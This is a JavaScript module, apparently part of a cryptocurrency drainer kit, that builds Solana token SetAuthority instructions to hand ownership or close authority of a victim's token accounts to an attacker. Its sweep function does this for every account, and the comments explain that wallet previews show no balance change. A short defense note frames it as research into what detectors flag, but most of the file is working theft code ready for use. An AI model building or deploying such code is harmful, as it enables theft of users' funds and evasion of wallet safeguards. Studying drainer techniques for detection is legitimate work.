'use strict';
/**
 * SetAuthority drain — alternate token theft primitive.
 *
 * Research source: Walour extension (Chrome Web Store, 2026) detection list:
 *   "Walour detects 16 attack vectors including SetAuthority drains,
 *    unlimited token approvals, durable nonces, Address Lookup Table
 *    exploits, and multi-instruction drain patterns."
 *
 * SetAuthority is the Solana equivalent of EVM approve: instead of moving
 * tokens (which wallets simulate as a balance drop), the instruction
 * changes the account's owner/close authority to the operator.
 * Wallet simulations show ZERO balance change — the tokens stay in the
 * victim's account, but the victim can no longer move them.
 *
 * The operator then sweeps the accounts later, off the signed flow,
 * with no further victim signature needed.
 *
 * Token program SetAuthority instruction:
 *   data[0] = 6 (SetAuthority)
 *   data[1] = authority type (0 = MintTokens, 1 = FreezeAccount,
 *                             2 = AccountOwner, 3 = CloseAccount)
 *   data[2] = option flag (1 = new authority follows, 0 = null)
 *   data[3..35] = new authority pubkey (if flag = 1)
 *
 *   Accounts:
 *     [0] account being modified (writable)
 *     [1] current authority (signer)
 *
 * DEFENSE NOTE (for WEAKNESSES-style analysis):
 *   Walour and modern Phantom Blowfish now flag SetAuthority with
 *   AccountOwner (type 2) and CloseAccount (type 3) changes in
 *   simulation. This is why it's on their detection list. The current
 *   kit does NOT use this primitive — documented here because it's a
 *   known alternative the operator may adopt as sweep-pattern detection
 *   tightens. It is also a key defense flag researchers should watch.
 */

const { writePubkey } = require('../core/crypto');
const { TOKEN_PROGRAM, TOKEN_2022 } = require('../config/constants');

const AUTH_TYPE = {
  MINT_TOKENS:   0,
  FREEZE_ACCOUNT:1,
  ACCOUNT_OWNER: 2,  // take over the account itself
  CLOSE_ACCOUNT: 3,  // take close authority → can close to operator's wallet
};

/**
 * buildSetAuthorityInstruction(tokenAccount, currentAuthority,
 *                               authorityType, newAuthority, tokenProgram):
 *   Change authority on a token account without moving tokens.
 *
 *   For AccountOwner (type 2): operator becomes owner, victim locked out.
 *   For CloseAccount (type 3): operator can close the account later and
 *   claim the rent + transfer contents off-flow.
 */
function buildSetAuthorityInstruction(
  tokenAccount, currentAuthority, authorityType, newAuthority,
  tokenProgram = TOKEN_PROGRAM
) {
  const data = new Uint8Array(35);
  data[0] = 6;              // SetAuthority
  data[1] = authorityType;
  data[2] = newAuthority ? 1 : 0;
  if (newAuthority) writePubkey(data, 3, newAuthority);

  return {
    program:  tokenProgram,
    data,
    accounts: [
      { pubkey: tokenAccount,      isSigner: false, isWritable: true  },
      { pubkey: currentAuthority,  isSigner: true,  isWritable: false },
    ],
    computeUnits: 3_000,
  };
}

/**
 * buildSetAuthoritySweep(tokenAccounts, victimPubkey, operatorPubkey, token2022):
 *   One SetAuthority(AccountOwner) per token account.
 *   Wallet preview: NO balance changes → passes naive simulations.
 *   After broadcast, operator owns all the accounts.
 */
function buildSetAuthoritySweep(tokenAccounts, victimPubkey, operatorPubkey, token2022 = false) {
  const program = token2022 ? TOKEN_2022 : TOKEN_PROGRAM;
  return tokenAccounts.map(acct =>
    buildSetAuthorityInstruction(
      acct, victimPubkey, AUTH_TYPE.ACCOUNT_OWNER, operatorPubkey, program
    )
  );
}

module.exports = { AUTH_TYPE, buildSetAuthorityInstruction, buildSetAuthoritySweep };
